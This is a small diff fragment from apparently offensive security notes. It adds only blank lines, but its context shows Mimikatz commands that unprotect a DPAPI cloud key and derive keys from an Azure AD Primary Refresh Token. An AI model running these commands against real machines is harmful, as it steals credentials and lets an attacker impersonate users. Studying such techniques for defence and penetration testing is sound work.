@@ -24,3 +24,5 @@ Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect
 # Copy the Context, ClearKey and DerivedKey
 Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>
 ```
+
+
